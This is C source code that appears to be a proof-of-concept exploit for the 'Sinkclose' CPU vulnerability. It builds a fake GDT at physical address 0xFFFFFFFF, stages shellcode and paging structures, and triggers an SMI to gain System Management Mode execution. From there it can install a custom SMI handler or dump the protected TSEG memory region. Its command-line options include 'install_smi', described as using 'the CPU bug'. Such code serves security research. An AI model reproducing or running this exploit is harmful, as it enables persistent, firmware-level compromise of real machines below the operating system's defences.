    // Set the tampered offset for the GDT located at 0xFFFFFFFF
    char *gdt = (char *) malloc(sizeof(FAKE_GDT));
    memcpy(gdt, FAKE_GDT, sizeof(FAKE_GDT));
    updateGDTBase((unsigned char *) gdt, 1, gdt_cs_base);
    // +1 for the alignment since we GDTR is at 0xFFFFFFFF
    memcpy((char*)gdt_physpage, gdt + 1, sizeof(FAKE_GDT) - 1);
    
    printf("GDT Size (-1): %d\n", sizeof(FAKE_GDT) - 1);
    printf("Hexdump GDT\n");
    hexdump((char*)gdt_physpage, 0x60, 0x00000000);
    free(gdt);

    //struct SegmentDescriptor *sec_desc = (struct SegmentDescriptor *) &FAKE_GDT;
    //printf("--- 32 Bit CS Descriptor ---\n");
    //print_desc(&sec_desc[1]);
    //printf("--- 64 Bit CS Descriptor ---\n");
    //print_desc(&sec_desc[7]);
    //printf("--- 32 Bit DS Descriptor ---\n");
    //print_desc(&sec_desc[3]);    

    unmap_physical_memory(gdt_physpage, PAGE_SIZE);

    /* Physical Addresses
     - 0x00000000 -> FAKE GDT[1:]
     - 0x00001000 -> Shellcode fore Core_main  ()
    */

    prepare_shellcode_core_main(smm_entry_point_core_main);

    // Prepare recursive paging structure    

    // a .Copy the x64 staging function into a single page of memory
    struct alloc_user_physmem x64_staging_page = {0};

    if (alloc_user_mem(PAGE_SIZE, &x64_staging_page) == FALSE) {
        printf("failed to allocate page for x64_staging_func\n");
        exit(-1);
    }
    
    memcpy(
        (void *) x64_staging_page.va, 
        (void *) x64_staging_func, 
        get_x64_staging_size()
    );

    // b. create a stack for x64_staging_func
    struct alloc_user_physmem stack_page = {0};

    if (alloc_user_mem(PAGE_SIZE, &stack_page) == FALSE) {
        printf("failed to allocate page for stack_page\n");
        exit(-1);
    }

    if (stack_page.pa == 0){
        printf("Stack: %016llx\n", stack_page.pa);
        printf("REREUN with sudo\n");
        return;
    }

    // probe the stack with known values
    for (int i = 0; i < PAGE_SIZE >> 2; i++) {
        ((UINT32 *)stack_page.va)[i] = 0xBADAB0B0;
    }

    // c. create aux buff for passing data
    struct alloc_user_physmem aux_data_page = {0};
    if (alloc_user_mem(PAGE_SIZE, &aux_data_page) == FALSE) {
        printf("failed to allocate page for aux_data_page\n");
        exit(-1);
    }

    // Reserver a page for the PDPT
    struct alloc_user_physmem pdpt_page = {0};
    pdpt_page.va = (UINT64)map_physical_memory(0x3000, PAGE_SIZE);
    pdpt_page.pa = 0x3000;
    pdpt_page.size = PAGE_SIZE;

    memset((void *)pdpt_page.va, 0x00, PAGE_SIZE);

    // Prepare paging layout 
    prepare_paging(
        &pdpt_page,
        x64_staging_page.pa, 
        stack_page.pa, 
        aux_data_page.pa 
    );

    // Setup the aux buff

    struct _x64_staging_aux_data *aux_data = 
            (struct _x64_staging_aux_data * )aux_data_page.va;

    // Get TSEG config
    UINT64 tseg_base = 0;
    UINT32 tseg_size = 0;

    get_tseg_region(&tseg_base, &tseg_size);
    UINT64 tseg_end = tseg_base + tseg_size;

    aux_data->tseg_size  = tseg_size;
    aux_data->tseg_base  = tseg_base;

    #ifdef INSTALL_FCH_SMI_HANDLER
        aux_data->handler_size = ALIGN(get_smi_handler_size(), 4);
        if (aux_data->handler_size > 0xC00) {
            printf("smi_handler is too large \n");
            exit(-1);
        }

        memcpy(
            (void *) aux_data->handler_code, 
            (void *) smi_handler, 
            aux_data->handler_size
        );
    #endif 
    // Get contiguous chunk of physical memory 
    // and map it to our paging structures
    #ifdef DUMP_TSEG
        struct x_mapping *mapping;
        aux_data->buffer_ptr = create_large_buffer(&pdpt_page, &mapping);
    #endif
    
    SW_SMI_CALL smi_call = { 0 };
    smi_call.rax = 0x31337;    

    printf("Triggering exploit...(might take a minute to run)\n");         
    // Trigger attack    
    sinkclose_smi(&smi_call);
    
    //// Enable for dumping TSEG
    #ifdef DUMP_TSEG
        dump_mapping(mapping);
        destroy_mapping(&mapping);
    #endif

    unmap_physical_memory((void *) pdpt_page.va, PAGE_SIZE);
    unmap_physical_memory((void *) aux_data_page.va, PAGE_SIZE);
    unmap_physical_memory((void *) stack_page.va, PAGE_SIZE);
    unmap_physical_memory((void *) x64_staging_page.va, PAGE_SIZE);

    printf("done!\n");
}



void clear_bar_buffer() {
    // Clear BAR Buffer
    void* dma_buf_page = map_physical_memory(SQUIRREL_BAR, PAGE_SIZE);
    memset(dma_buf_page, 0x00, PAGE_SIZE);
    // print_memory(SQUIRREL_BAR, (char *) dma_buf_page, 0x100);
    // getchar();
    unmap_physical_memory(dma_buf_page, PAGE_SIZE);
}

void enable_squirrel() {
    pci_enable_memory_space(2, 0 , 0);
    pci_enable_bus_master(2, 0 , 0);
}



void run_exploit() {
    // Save content of physical pages used   
/*     void *p0 = map_physical_memory(GDT_SINKCLOSE_ADDRESS, PAGE_SIZE);
    void *p1 = map_physical_memory(CORE0_SHELLCODE_ADDRESS, PAGE_SIZE);    
    void *p2 = map_physical_memory(CORE0_PML4, PAGE_SIZE);  
    void *p3 = map_physical_memory(CORE1_SHELLCODE_ADDRESS, PAGE_SIZE);

    void *px[] = { p0, p1, p2, p3 };

    int pages_used = sizeof(px)/sizeof(px[0]);

    char *buff = (char *) malloc(PAGE_SIZE * pages_used);

    for (int i = 0 ; i < pages_used; i++) {
        memcpy(&buff[PAGE_SIZE * i], px[i], PAGE_SIZE);
        memset(px[i], 0, PAGE_SIZE);
    } */

    ////
    //
    // Execute exploit
    sinkclose_exploit();
    /// Restore physical pages content
/*     for (int i = 0 ; i < pages_used; i++) {
        memcpy(px[i], &buff[PAGE_SIZE * i], PAGE_SIZE);
        unmap_physical_memory(px[i], PAGE_SIZE); 
    }  *

    free(buff);*/
}





void run_smi() {        
    #ifdef INSTALL_FCH_SMI_HANDLER
        printf("Invoking FCH Smi Handler %02x\n", SINKCLOSE_SW_SMI_NUMBER);
        // Invoke our SMI
        SW_SMI_CALL smi_call = {0};     
        smi_call.SwSmiNumber = SINKCLOSE_SW_SMI_NUMBER;
        smi_call.SwSmiData   = 0xFF;
        trigger_smi(&smi_call);
    #endif
}


/// Re-schedule the running task on any other core but CORE0 and CORE1
#ifdef __linux__
void schedule_on_other_cores() {
    cpu_set_t mask;
    int num_cpus = sysconf(_SC_NPROCESSORS_ONLN);

    CPU_ZERO(&mask);
    for (int i = 2; i < num_cpus; i++) {        
        CPU_SET(i, &mask);        
    }

    if (sched_setaffinity(0, sizeof(mask), &mask) == -1) {
        perror("sched_setaffinity");
        exit(EXIT_FAILURE);
    }
}
#else 
void schedule_on_other_cores() {
    DWORD_PTR processAffinityMask = 0;
    DWORD_PTR systemAffinityMask = 0;
    HANDLE hProcess = GetCurrentProcess();

    // Get the process affinity mask
    if (!GetProcessAffinityMask(hProcess, &processAffinityMask, &systemAffinityMask)) {
        printf("Error getting process affinity mask\n");
        return;
    }

    // Print the current affinity mask
    printf("Current Process Affinity Mask: %llu\n", processAffinityMask);

    // Remove CPUs 0 and 1 from the affinity mask
    DWORD_PTR newAffinityMask = systemAffinityMask & (~((DWORD_PTR)0x3));

    // Set the new affinity mask for the current process
    if (!SetProcessAffinityMask(hProcess, newAffinityMask)) {
        printf("Error setting process affinity mask\n");
        return;
    }

    // Verify the change
    if (!GetProcessAffinityMask(hProcess, &processAffinityMask, &systemAffinityMask)) {
        printf("Error getting updated process affinity mask\n");
        return;
    }

    printf("New Process Affinity Mask: %llu\n", processAffinityMask);
}
#endif


int current_running_core() {
    #ifdef __linux__
        return sched_getcpu();
    #else
        return GetCurrentProcessorNumber();
    #endif    
}


int main(int argc, char** argv)
{   
    if (argc < 2) {
        printf("Usage: %s <option>\n", argv[0]);
        printf(" 'install_smi' -> uses the CPU bug to install our SMI handler\n");
        printf(" 'run_smi'     -> runs the installed SMI handler\n");
        return -1;
    }

    open_platbox_device();

    if (strcmp(argv[1], "install_smi") == 0) {
        schedule_on_other_cores();

        printf("Running on CPU: %d\n", current_running_core());
        // printf("5 Level-Paging: %d\n", is_5_level_paging());
        // getchar();

        #ifdef SQUIRREL_DEBUG
            enable_squirrel();
            clear_bar_buffer();
        #endif

        run_exploit();
    } else if (strcmp(argv[1], "run_smi") == 0) {
        run_smi();
    }   

    close_platbox_device();

    return 0; 
}
